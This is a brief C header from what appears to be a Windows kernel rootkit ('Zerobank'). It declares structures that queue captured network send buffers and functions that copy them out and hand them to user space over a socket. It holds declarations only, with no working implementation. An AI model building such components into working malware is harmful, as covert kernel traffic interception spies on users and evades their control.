#pragma once

typedef struct _ZEROBANK_FILTER_SEND_REQUESTS {
	LIST_ENTRY Entry;
	CHAR SendBuffer[2048];
}ZEROBANK_FILTER_SEND_REQUESTS, *PZEROBANK_FILTER_SEND_REQUESTS;

typedef struct _ZEROBANK_SEND_HEAD {
	LIST_ENTRY Entry;
	ULONG NumberOfEntries;
}ZEROBANK_SEND_HEAD, *PZEROBANK_SEND_HEAD;

PZEROBANK_SEND_HEAD g_rk_get_total_send_request();
ULONG g_rk_copy_sendlist_to_buffer(IN PZEROBANK_FILTER_SEND_REQUESTS pBuffer, IN PROOTKIT_API_HASH Hash);
BOOLEAN g_rk_sendrequests_to_userspace(IN PFILE_OBJECT pSocket, IN PROOTKIT_API_HASH Hash);
extern PZEROBANK_SEND_HEAD g_send_head;
